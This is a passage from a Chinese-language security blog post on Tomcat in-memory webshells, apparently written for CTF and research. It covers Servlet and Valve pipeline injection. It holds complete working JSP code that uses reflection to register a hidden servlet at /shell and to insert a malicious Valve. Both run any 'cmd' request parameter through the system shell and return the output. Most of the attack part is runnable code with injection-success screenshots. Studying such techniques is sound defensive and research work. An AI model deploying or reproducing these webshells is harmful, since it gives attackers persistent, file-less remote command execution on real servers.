class="string">&quot;cmd&quot;</span>);</span><br><span class="line">           	<span class="type">boolean</span> <span class="variable">isLinux</span> <span class="operator">=</span> <span class="literal">true</span>;</span><br><span class="line">            <span class="type">String</span> <span class="variable">osTyp</span> <span class="operator">=</span> System.getProperty(<span class="string">&quot;os.name&quot;</span>);</span><br><span class="line">            <span class="keyword">if</span> (osTyp != <span class="literal">null</span> &amp;&amp; osTyp.toLowerCase().contains(<span class="string">&quot;win&quot;</span>)) &#123;</span><br><span class="line">                isLinux = <span class="literal">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            String[] cmds = isLinux ? <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;sh&quot;</span>, <span class="string">&quot;-c&quot;</span>, cmd&#125; : <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;cmd.exe&quot;</span>, <span class="string">&quot;/c&quot;</span>, cmd&#125;;</span><br><span class="line">            <span class="type">InputStream</span> <span class="variable">in</span> <span class="operator">=</span> Runtime.getRuntime().exec(cmds).getInputStream();</span><br><span class="line">            <span class="type">Scanner</span> <span class="variable">s</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Scanner</span>(in).useDelimiter(<span class="string">&quot;\\a&quot;</span>);</span><br><span class="line">            <span class="type">String</span> <span class="variable">output</span> <span class="operator">=</span> s.hasNext() ? s.next() : <span class="string">&quot;&quot;</span>;</span><br><span class="line">            <span class="comment">//普通回显</span></span><br><span class="line">            <span class="type">PrintWriter</span> <span class="variable">out</span> <span class="operator">=</span> servletResponse.getWriter();</span><br><span class="line">            out.println(output);</span><br><span class="line">            out.flush();</span><br><span class="line">            out.close();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> String <span class="title function_">getServletInfo</span><span class="params">()</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">destroy</span><span class="params">()</span> &#123;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">%&gt;</span><br><span class="line"> </span><br><span class="line">&lt;%</span><br><span class="line">    <span class="comment">//获取Wrapper并且将我们的Servlet放入Wrapper中</span></span><br><span class="line">    <span class="type">Shell_Servlet</span> <span class="variable">shell_servlet</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Shell_Servlet</span>();</span><br><span class="line">    <span class="type">String</span> <span class="variable">name</span> <span class="operator">=</span><span class="string">&quot;Boogipop&quot;</span>;</span><br><span class="line"> </span><br><span class="line">    <span class="type">Wrapper</span> <span class="variable">wrapper</span> <span class="operator">=</span> standardContext.createWrapper();</span><br><span class="line">    wrapper.setLoadOnStartup(<span class="number">1</span>);</span><br><span class="line">    wrapper.setName(name);</span><br><span class="line">    wrapper.setServlet(shell_servlet);</span><br><span class="line">    wrapper.setServletClass(shell_servlet.getClass().getName());</span><br><span class="line"><span class="comment">//这里获取的是类名称org.apache.jsp.servlet_jsp$Shell_Servlet</span></span><br><span class="line">%&gt;</span><br><span class="line"> </span><br><span class="line">&lt;%</span><br><span class="line">    <span class="comment">//将wrapper添加进StandardContext</span></span><br><span class="line">    standardContext.addChild(wrapper);</span><br><span class="line">    standardContext.addServletMappingDecoded(<span class="string">&quot;/shell&quot;</span>,name);</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure>
用的时候吧注释去掉，会报错QWQ：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1673354254091-27a17512-cc3d-4a3e-a6ea-66164a87e1f0.png#averageHue=%23fdfdef&clientId=udc2ab01b-dc30-4&from=paste&height=90&id=u883d4a69&name=image.png&originHeight=112&originWidth=709&originalType=binary&ratio=1&rotation=0&showTitle=false&size=6896&status=done&style=none&taskId=ua8e6fcb2-96ac-4443-86fc-74bb11b028f&title=&width=567.2" alt="image.png"><br>哟西成功注入，Servlet就告一段落了</li>
</ol>
<h1 id="x2F-Value型内存马"><a href="#x2F-Value型内存马" class="headerlink" title="&#x2F;Value型内存马"></a>&#x2F;Value型内存马</h1><h2 id="流程分析-1"><a href="#流程分析-1" class="headerlink" title="流程分析"></a>流程分析</h2><p>参考：<br><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/11988#toc-19">https://xz.aliyun.com/t/11988#toc-19</a><br>value是Tomcat中对Container组件进行的扩展。Container组件也就是前文一直提及的Tomcat四大容器<br>Tomcat由四大容器组成，分别是<strong>Engine、Host、Context、Wrapper</strong>。这四个组件是负责关系，存在包含关系。只包含一个引擎（Engine）：</p>
<blockquote>
<p>Engine（引擎）：表示可运行的Catalina的servlet引擎实例，并且包含了servlet容器的核心功能。在一个服务中只能有一个引擎。同时，作为一个真正的容器，Engine元素之下可以包含一个或多个虚拟主机。它主要功能是将传入请求委托给适当的虚拟主机处理。如果根据名称没有找到可处理的虚拟主机，那么将根据默认的Host来判断该由哪个虚拟主机处理。<br>Host （虚拟主机）：作用就是运行多个应用，它负责安装和展开这些应用，并且标识这个应用以便能够区分它们。它的子容器通常是 Context。一个虚拟主机下都可以部署一个或者多个Web App，每个Web App对应于一个Context，当Host获得一个请求时，将把该请求匹配到某个Context上，然后把该请求交给该Context来处理。主机组件类似于Apache中的虚拟主机，但在Tomcat中只支持基于FQDN(完全合格的主机名)的“虚拟主机”。Host主要用来解析web.xml。<br>Context（上下文）：代表 Servlet 的 Context，它具备了 Servlet 运行的基本环境，它表示Web应用程序本身。Context 最重要的功能就是管理它里面的 Servlet 实例，一个Context代表一个Web应用，一个Web应用由一个或者多个Servlet实例组成。<br>Wrapper（包装器）：代表一个 Servlet，它负责管理一个 Servlet，包括的 Servlet 的装载、初始化、执行以及资源回收。Wrapper 是最底层的容器，它没有子容器了，所以调用它的 addChild 将会报错。</p>
</blockquote>
<p>其实上述的话可以用下面这张图很好的概括：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1675683486970-80e3e8bc-46f4-4ccf-b598-ad9dcb9d4364.png#averageHue=%23f1f1f1&clientId=u4e79a491-b75c-4&from=paste&id=u082b17a8&name=image.png&originHeight=958&originWidth=1280&originalType=url&ratio=1&rotation=0&showTitle=false&size=211704&status=done&style=none&taskId=uc26f5c40-44e9-4449-a945-a1e3a9f63ad&title=" alt="image.png"><br>在四个组件中都有pipeline，而储存在pipeline中的就是对应的Value，我们可以创建一个demo分析一下:</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.kino;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.catalina.connector.Request;</span><br><span class="line"><span class="keyword">import</span> org.apache.catalina.connector.Response;</span><br><span class="line"><span class="keyword">import</span> org.apache.catalina.core.StandardContext;</span><br><span class="line"><span class="keyword">import</span> org.apache.catalina.valves.ValveBase;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.servlet.ServletException;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServlet;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletRequest;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletResponse;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">EvilValve</span> <span class="keyword">extends</span> <span class="title class_">ValveBase</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">invoke</span><span class="params">(Request request, Response response)</span> <span class="keyword">throws</span> IOException, ServletException &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;111&quot;</span>);</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Runtime.getRuntime().exec(request.getParameter(<span class="string">&quot;cmd&quot;</span>));</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">testvalue</span> <span class="keyword">extends</span> <span class="title class_">HttpServlet</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">doGet</span><span class="params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="keyword">throws</span> ServletException, IOException &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">Field</span> <span class="variable">reqF</span> <span class="operator">=</span> req.getClass().getDeclaredField(<span class="string">&quot;request&quot;</span>);</span><br><span class="line">            reqF.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            <span class="type">Request</span> <span class="variable">request</span> <span class="operator">=</span> (Request) reqF.get(req);</span><br><span class="line">            <span class="type">StandardContext</span> <span class="variable">standardContext</span> <span class="operator">=</span> (StandardContext) request.getContext();</span><br><span class="line">            standardContext.getPipeline().addValve(<span class="keyword">new</span> <span class="title class_">EvilValve</span>());</span><br><span class="line">            resp.getWriter().write(<span class="string">&quot;inject success&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>在sout上打上debug，然后调试看看：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1675684459444-b7eec1fb-b261-4584-80c2-0fdaa36fef75.png#averageHue=%232c2e2c&clientId=u0f0a9c21-8527-4&from=paste&height=708&id=u16414861&name=image.png&originHeight=885&originWidth=1920&originalType=binary&ratio=1&rotation=0&showTitle=false&size=2295575&status=done&style=none&taskId=u5e704e5b-0a4b-4644-b276-23811993fb5&title=&width=1536" alt="image.png"><br>调用栈中出现了很多value，并且可以看到触发的第一个value是StandardEngineValue，最后才是我们自定义的value，因此可以跳到StandardEngineValue中看一看：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1675684530565-68ccdde9-a1fd-4c59-b715-b3366c2c767b.png#averageHue=%232c2e2d&clientId=u0f0a9c21-8527-4&from=paste&height=495&id=u4eab384a&name=image.png&originHeight=619&originWidth=1870&originalType=binary&ratio=1&rotation=0&showTitle=false&size=1661480&status=done&style=none&taskId=u36846ad4-7f90-414a-bdea-901d19e397a&title=&width=1496" alt="image.png"><br>在这里获取到了第一个value，接下来就是按顺序不断的获取value，从这里可以发现，<strong>value链是通过invoke方法进行放行的，当前value的invoke执行后就会执行下一个value的invoke方法</strong>，我们进一步溯源：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1675685064699-5c3bd5d6-2801-4557-bb0a-11632cc302f1.png#averageHue=%232c2e2c&clientId=u0f0a9c21-8527-4&from=paste&height=646&id=u0f3c228c&name=image.png&originHeight=808&originWidth=1570&originalType=binary&ratio=1&rotation=0&showTitle=false&size=1819954&status=done&style=none&taskId=ud80e93d4-888a-4d6b-a827-9ee35b57758&title=&width=1256" alt="image.png"><br>从这一步可以看出获取组件的顺序，先获取Container在获取pipeline最后获取value<br>并且在StandardPipeline中有方法<code>addvalue</code>：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1675685278336-59e0c403-9bbb-4ab6-93f6-fc9027e31129.png#averageHue=%232f312c&clientId=u0f0a9c21-8527-4&from=paste&height=367&id=ue16f2886&name=image.png&originHeight=459&originWidth=1536&originalType=binary&ratio=1&rotation=0&showTitle=false&size=1059878&status=done&style=none&taskId=u050e11e4-4a33-4124-9fb2-8ed80f05655&title=&width=1228.8" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1675685292022-64a17eae-5146-4eb3-85fc-a05c97f434f4.png#averageHue=%232b2d2a&clientId=u0f0a9c21-8527-4&from=paste&height=441&id=uf6913aa3&name=image.png&originHeight=551&originWidth=1865&originalType=binary&ratio=1&rotation=0&showTitle=false&size=1455177&status=done&style=none&taskId=u9114a8e9-db90-4528-8ef0-df1bb019d9b&title=&width=1492" alt="image.png"><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1675685292236-ae0c909e-2a1a-4524-9a1e-84d5c2f28891.png#averageHue=%232b2d2a&clientId=u0f0a9c21-8527-4&from=paste&height=441&id=ud9747eaf&name=image.png&originHeight=551&originWidth=1865&originalType=binary&ratio=1&rotation=0&showTitle=false&size=1455177&status=done&style=none&taskId=ufba73db4-d6f5-4917-a78d-20601aef1c1&title=&width=1492" alt="image.png"><br>那么我们注入的思路就很明确了</p>
<h2 id="获取contenxt"><a href="#获取contenxt" class="headerlink" title="获取contenxt"></a>获取contenxt</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Field</span> <span class="variable">requestField</span> <span class="operator">=</span> request.getClass().getDeclaredField(<span class="string">&quot;request&quot;</span>);</span><br><span class="line">    requestField.setAccessible(<span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">final</span> <span class="type">Request</span> <span class="variable">request1</span> <span class="operator">=</span> (Request) requestField.get(request);</span><br><span class="line">    <span class="type">StandardContext</span> <span class="variable">standardContext</span> <span class="operator">=</span> (StandardContext) request1.getContext();</span><br></pre></td></tr></table></figure>

<h2 id="获取pipeline"><a href="#获取pipeline" class="headerlink" title="获取pipeline"></a>获取pipeline</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Field</span> <span class="variable">pipelineField</span> <span class="operator">=</span> ContainerBase.class.getDeclaredField(<span class="string">&quot;pipeline&quot;</span>);</span><br><span class="line">    pipelineField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    <span class="type">StandardPipeline</span> <span class="variable">standardPipeline1</span> <span class="operator">=</span> (StandardPipeline) pipelineField.get(standardContext);</span><br></pre></td></tr></table></figure>


<h2 id="创建恶意value并且添加进standardpipeline"><a href="#创建恶意value并且添加进standardpipeline" class="headerlink" title="创建恶意value并且添加进standardpipeline"></a>创建恶意value并且添加进standardpipeline</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">ValveBase</span> <span class="variable">valveBase</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ValveBase</span>() &#123;</span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">invoke</span><span class="params">(Request request, Response response)</span>&#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                Runtime.getRuntime().exec(<span class="string">&quot;calc&quot;</span>);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    standardPipeline1.addValve(valveBase);</span><br></pre></td></tr></table></figure>
<p>这里为了让程序继续执行下去，恶意value类也必须要调用下一个value的invoke方法，否则无法正常进行：<br><code>this.getNext().invoke(request, response);</code></p>
<h2 id="完整代码"><a href="#完整代码" class="headerlink" title="完整代码"></a>完整代码</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.lang.reflect.Field&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.connector.Request&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.valves.ValveBase&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.connector.Response&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.io.IOException&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.core.*&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.io.InputStream&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.util.Scanner&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page contentType=<span class="string">&quot;text/html;charset=UTF-8&quot;</span> language=<span class="string">&quot;java&quot;</span> %&gt;</span><br><span class="line"></span><br><span class="line">&lt;%</span><br><span class="line">    <span class="type">Field</span> <span class="variable">requestField</span> <span class="operator">=</span> request.getClass().getDeclaredField(<span class="string">&quot;request&quot;</span>);</span><br><span class="line">    requestField.setAccessible(<span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">final</span> <span class="type">Request</span> <span class="variable">request1</span> <span class="operator">=</span> (Request) requestField.get(request);</span><br><span class="line">    <span class="type">StandardContext</span> <span class="variable">standardContext</span> <span class="operator">=</span> (StandardContext) request1.getContext();</span><br><span class="line"></span><br><span class="line">    <span class="type">Field</span> <span class="variable">pipelineField</span> <span class="operator">=</span> ContainerBase.class.getDeclaredField(<span class="string">&quot;pipeline&quot;</span>);</span><br><span class="line">    pipelineField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    <span class="type">StandardPipeline</span> <span class="variable">standardPipeline1</span> <span class="operator">=</span> (StandardPipeline) pipelineField.get(standardContext);</span><br><span class="line"></span><br><span class="line">    <span class="type">ValveBase</span> <span class="variable">valveBase</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ValveBase</span>() &#123;</span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">invoke</span><span class="params">(Request request, Response response)</span> <span class="keyword">throws</span> ServletException,IOException &#123;</span><br><span class="line">            <span class="keyword">if</span> (request.getParameter(<span class="string">&quot;cmd&quot;</span>) != <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="type">boolean</span> <span class="variable">isLinux</span> <span class="operator">=</span> <span class="literal">true</span>;</span><br><span class="line">                <span class="type">String</span> <span class="variable">osTyp</span> <span class="operator">=</span> System.getProperty(<span class="string">&quot;os.name&quot;</span>);</span><br><span class="line">                <span class="keyword">if</span> (osTyp != <span class="literal">null</span> &amp;&amp; osTyp.toLowerCase().contains(<span class="string">&quot;win&quot;</span>)) &#123;</span><br><span class="line">                    isLinux = <span class="literal">false</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                String[] cmds = isLinux ? <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;sh&quot;</span>, <span class="string">&quot;-c&quot;</span>, request.getParameter(<span class="string">&quot;cmd&quot;</span>)&#125; : <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;cmd.exe&quot;</span>, <span class="string">&quot;/c&quot;</span>, request.getParameter(<span class="string">&quot;cmd&quot;</span>)&#125;;</span><br><span class="line">                <span class="type">InputStream</span> <span class="variable">in</span> <span class="operator">=</span> Runtime.getRuntime().exec(cmds).getInputStream();</span><br><span class="line">                <span class="type">Scanner</span> <span class="variable">s</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Scanner</span>(in).useDelimiter(<span class="string">&quot;\\A&quot;</span>);</span><br><span class="line">                <span class="type">String</span> <span class="variable">output</span> <span class="operator">=</span> s.hasNext() ? s.next() : <span class="string">&quot;&quot;</span>;</span><br><span class="line">                response.getWriter().write(output);</span><br><span class="line">                response.getWriter().flush();</span><br><span class="line">                <span class="built_in">this</span>.getNext().invoke(request, response);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    standardPipeline1.addValve(valveBase);</span><br><span class="line"></span><br><span class="line">    out.println(<span class="string">&quot;evil valve inject done!&quot;</span>);</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure>
<p><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1675685704913-386c4789-06b5-4f54-9df5-016bf837603f.png#averageHue=%23f1f1f1&clientId=u0f0a9c21-8527-4&from=paste&height=642&id=u63fbad0f&name=image.png&originHeight=802&originWidth=1916&originalType=binary&ratio=1&rotation=0&showTitle=false&size=50337&status=done&style=none&taskId=u8f0ac57a-7b9c-4fcb-9ae3-0001a5a2df8&title=&width=1532.8" alt="image.png"></p>
<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>到这里的话，Tomcat内存马分析就正式告一段落了，接下来就是分析spring内存马和tomcat内存马结合反序列化的利用</p>

    </div>

    
    <div class="about">
        <h1>About this Post</h1>
        <div class="details">
            <p>This post is written by Boogipop, licensed under <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc/4.0">CC BY-NC 4.0</a>.</p>
        </div>
        
        <p class="tags">
            
            <i class="icon"></i>
            <a href="/tags/Java/" class="tag">#Java</a><a href="/tags/内存马/" class="tag">#内存马</a><a href="/tags/CTF/" class="tag">#CTF</a>
        </p>
        
    </div>
    

    <div class="container post-prev-next">
        
        <a href="/2023/03/02/FilterChain%E6%94%BB%E5%87%BB%E8%A7%A3%E6%9E%90%E5%8F%8A%E5%88%A9%E7%94%A8/" class="next">
            <div>
                <div class="text">
                    <p class="label">Next</p>
                    <h3 class="title">FilterChain攻击解析及利用</h3>
                </div>
            </div>
        </a>
        
        
        <a href="/2023/03/02/Spring%E5%86%85%E5%AD%98%E9%A9%AC%E5%88%86%E6%9E%90%E5%8F%8A%E5%88%A9%E7%94%A8/" class="prev">
            <div>
                <div class="text">
                    <p class="label">Previous</p>
                    <h3 class="title">Spring内存马分析利用</>
                </div>
            </div>
        </a>
        
    </div>

    
        
        
        <script src="https://giscus.app/client.js" data-repo="Boogipop/Boogipop.github.io" data-repo-id="R_kgDOIFi78g" data-category="Announcements" data-category-id="DIC_kwDOIFi78s4Cav9f" data-mapping="pathname" data-strict="1" data-reactions-enabled="1" data-emit-metadata="0" data-input-position="top" data-theme="preferred_color_scheme" data-lang="zh-CN" crossorigin="anonymous" async></script>
        
    
</article>

        <footer>
    <div class="inner">
        <div class="links">
            
            <div class="group">
                <h2 class="title">Blog</h2>
                
                <a href="/" class="item">Blog</a>
                
                <a href="/archives" class="item">Archives</a>
                
                <a href="/tags" class="item">Tags</a>
                
                <a href="/categories" class="item">Categories</a>
                
                <a href="/search" class="item">Search</a>
                
                <a href="/friends" class="item">Friends</a>
                
                <a href="/about" class="item">About</a>
                
                <a href="/atom.xml" class="item">RSS</a>
                
            </div>
            
            <div class="group">
                <h2 class="title">Projects</h2>
                
                <a target="_blank" rel="noopener" href="https://github.com/MrWillCom/rsa-cli" class="item">RSA CLI</a>
                
                <a target="_blank" rel="noopener" href="https://github.com/MrWillCom/hexo-theme-cupertino" class="item">Hexo Theme Cupertino</a>
                
                <a target="_blank" rel="noopener" href="https://github.com/MrWillCom/a-calendar" class="item">A Calendar</a>
                
                <a target="_blank" rel="noopener" href="https://github.com/MrWillCom/auto-mirroring-bucket" class="item">Auto Mirroring Bucket</a>
                
            </div>
            
            <div class="group">
                <h2 class="title">Me</h2>
                
                <a target="_blank" rel="noopener" href="https://github.com/MrWillCom" class="item">GitHub</a>
                
                <a target="_blank" rel="noopener" href="https://codepen.io/mrwillcom" class="item">CodePen</a>
                
                <a target="_blank" rel="noopener" href="https://www.patreon.com/MrWillCom" class="item">Patreon</a>
                
                <a target="_blank" rel="noopener" href="https://noc.social/@MrWillCom" class="item">Mastodon</a>
                
                <a target="_blank" rel="noopener" href="https://discord.gg/UKuFDjcfY8" class="item">Discord</a>
                
                <a href="mailto:mr.will.com@outlook.com" class="item">Email</a>
                
            </div>
            
        </div>
        <span>&copy; 2024 Boogipop<br>Powered by <a href="http://hexo.io/" target="_blank">Hexo</a> </span>
        
        
            <br>
            <div class="color-scheme-toggle" role="radiogroup" id="theme-color-scheme-toggle">
                <label>
                    <input type="radio" value="light">
                    <span>Light</span>
                </label>
                <label>
                    <input type="radio" value="dark">
                    <span>Dark</span>
                </label>
                <label>
                    <input type="radio" value="auto">
                    <span>Auto</span>
                </label>
            </div>
        
    </div>
</footer>


        
<script src="/js/main.js"></script>

        
        
        

        
        <script src="https://unpkg.com/scrollreveal"></script>
		
        <script>
            window.addEventListener('load', () => {
                ScrollReveal({ delay: 250, reset: true, easing: 'cubic-bezier(0, 0, 0, 1)' })
                ScrollReveal().reveal('.post-list-item .cover-img img')
                ScrollReveal().reveal('.post-list-item, .card, .content p img, .content .block-large img', { distance: '60px', origin: 'bottom', duration: 800 })
            })
        </script>
        
    </body>
</html>